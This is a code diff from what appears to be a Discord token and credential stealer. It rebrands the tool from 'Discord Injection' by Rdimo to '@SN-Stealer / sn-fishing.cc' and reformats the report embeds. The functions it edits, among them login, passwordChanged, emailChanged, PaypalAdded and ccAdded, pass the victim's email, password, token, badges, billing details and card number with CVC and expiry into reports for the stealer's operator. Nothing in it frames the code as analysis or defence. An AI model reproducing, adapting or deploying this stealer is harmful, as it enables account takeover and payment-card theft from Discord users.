@@ -675,17 +675,31 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
+            name: '<:1205bluepawprints:985668463899050014> @SN - Badges Type:',
+            value: `${badges}`,
+            inline: true,
           },
+          {
+            name: '<a:9048bluemendedheart:986020801004318740> @SN - Nitro Type:',
+//             value: `${nitro}`,
+               value: `*Soon...*`,
+            inline: true,
+           },
+          {
+            name: '<a:6132lightblueheartspin:985668720422682724> @SN - Billing Type:',
+            value: `${billing}`,
+            inline: true,
+           },
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '@SN-Stealer / sn-fishing.cc',
+        },
+        thumbnail: {
+            url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
         },
       },
     ],
@@ -727,7 +741,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '@SN-Stealer / sn-fishing.cc',
         },
       },
     ],
@@ -769,7 +783,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '@SN-Stealer / sn-fishing.cc',
         },
       },
     ],
@@ -811,7 +825,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '@SN-Stealer / sn-fishing.cc',
         },
       },
     ],
@@ -853,7 +867,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '@SN-Stealer / sn-fishing.cc',
         },
       },
     ],
@@ -897,7 +911,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '@SN-Stealer / sn-fishing.cc',
         },
       },
     ],
